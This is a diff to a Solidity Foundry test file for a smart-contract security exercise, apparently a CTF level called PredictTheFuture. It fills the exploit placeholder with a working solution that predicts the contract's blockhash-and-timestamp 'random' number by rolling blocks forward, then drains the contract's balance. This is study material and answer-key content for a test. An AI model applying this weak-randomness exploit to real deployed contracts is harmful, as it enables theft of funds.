@@ -3,7 +3,7 @@ pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
 import "src/06_PredictTheFuture/PredictTheFuture.sol";
-
+// Случайное число можно вычислить заранее
 // forge test --match-contract PredictTheFutureTest -vvvv
 contract PredictTheFutureTest is BaseTest {
     PredictTheFuture instance;
@@ -16,8 +16,14 @@ contract PredictTheFutureTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        instance.setGuess{value: 0.01 ether}(8);
+        while(address(instance).balance > 0) {
+            vm.roll(block.number + 1);
+            vm.warp(block.timestamp + 1);
+            uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;
+            if(answer == 8) {
+                instance.solution();
+            }}
         checkSuccess();
     }
 
